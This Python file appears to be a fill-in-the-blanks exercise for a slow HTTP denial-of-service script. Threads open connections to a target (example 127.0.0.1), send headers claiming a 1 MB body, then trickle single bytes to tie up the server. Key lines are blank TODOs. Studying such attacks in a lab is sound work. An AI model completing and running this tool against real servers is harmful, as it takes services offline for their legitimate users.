import socket
import time
import threading

# TODO: Define target server host, port, and path
# Example: target_host = "127.0.0.1"
# Example: target_port = 8080
# Example: path = "/heavy"
# Example: threads_count = 100

target_host = 
target_port = 
path = 
threads_count =  

def attack():
    while True: 
        try:
            # TODO: Create a TCP socket and set timeout
            # Use socket.socket(), AF_INET for IPv4, SOCK_STREAM for TCP
            s = 
            # Set timeout to 4 seconds using s.settimeout
            s.
            # Connect to target host and port using s.connect
            s.

            header = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 1000000\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            s.send(header.encode())
            print(f"[*] [Wątek {threading.current_thread().name}] Połączono. Start slow send...")

            while True:
                # TODO: Send a single byte periodically to keep connection alive
                # Use s.send() with a single byte
                # Use time.sleep() to create delay between sends
                s.
                
        except socket.error:
            print(f"[!] [Wątek {threading.current_thread().name}] Połączenie przerwane, restartuję...")
            time.sleep(1)
        finally:
            s.close()

if __name__ == "__main__":
    print(f"Uruchamiam atak na {target_host} przy użyciu {threads_count} wątków...")

    threads = []
    for i in range(threads_count):
        # TODO: Create a Thread object with attack function as target
        # Give each thread a name like "Worker-{i}"
        # Set daemon=True so threads exit when main thread exits
        t =(target=, name=)
        t. 
        threads.append(t)
        t.start()
        # TODO: Add small delay between thread creation to stagger connections, e.g. 0.1 seconds
        time. 

    # Keep main thread alive to allow worker threads to run
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Atak przerwany przez użytkownika.")
